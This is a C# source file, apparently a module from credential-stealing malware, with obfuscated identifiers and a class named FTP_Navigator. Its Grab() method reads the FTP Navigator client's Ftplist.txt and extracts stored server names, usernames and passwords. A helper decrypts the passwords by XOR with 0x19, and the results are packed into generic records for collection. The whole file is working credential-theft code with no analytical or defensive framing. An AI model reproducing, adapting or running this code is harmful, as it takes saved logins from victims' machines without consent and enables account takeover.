using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;

namespace rk937aHHc
{
	public class FTP_Navigator : EtbH
	{
		public FTP_Navigator()
		{
			this.BieV = "FTP Navigator";
		}

		public string BieV { get; set; }

        public List<WTitxI2m> Grab()
        {
            string path = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\FTP Navigator", "Ftplist.txt");
            List<WTitxI2m> list = new List<WTitxI2m>();

            if (!File.Exists(path))
                return list;

            string[] lines = File.ReadAllLines(path);
            if (lines == null || lines.Length == 0)
                return list;

            string host = string.Empty;
            string username = string.Empty;
            string password = string.Empty;

            foreach (string line in lines)
            {
                string[] parts = line.Split('=');
                if (parts.Length != 2)
                    continue;

                string key = parts[0].Trim();
                string value = parts[1].Trim();

                switch (key)
                {
                    case "Server":
                        host = value;
                        break;
                    case "User":
                        username = value;
                        break;
                    case "Password":
                        password = string.IsNullOrEmpty(value) ? "No Password" : FTP_Navigator.dyje3l0fS(value);
                        break;
                }

                if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    list.Add(new WTitxI2m
                    {
                        data1 = host,
                        data2 = username,
                        data3 = password,
                        data4 = this.BieV
                    });

                    host = username = password = string.Empty;
                }
            }

            return list;
        }

        private static string dyje3l0fS(string encrypted)
        {
            string result = "";

            try
            {
                foreach (char c in encrypted)
                {
                    result += (char)(c ^ 0x19); // 0x19 = 25
                }
            }
            catch
            {
            }

            return result;
        }
    }
}
